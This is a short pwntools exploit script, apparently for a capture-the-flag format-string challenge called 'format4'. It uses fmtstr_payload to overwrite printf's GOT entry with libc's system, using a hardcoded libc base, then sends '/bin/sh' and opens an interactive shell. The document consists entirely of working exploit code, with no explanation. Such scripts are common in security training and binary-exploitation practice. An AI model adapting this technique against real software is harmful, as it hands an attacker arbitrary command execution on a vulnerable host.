from pwn import *

elf = context.binary = ELF("./format4")
libc = elf.libc

libc.address = 0xf7d8c000

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='continue')

    return process(elf.path)

p = start()

TARGET = elf.got["printf"]

writes = {TARGET: libc.sym["system"]}
payload = fmtstr_payload(7, writes, write_size='short')

log.info(payload)
p.sendline(payload)
p.clean()
p.sendline(b"/bin/sh")
p.interactive()
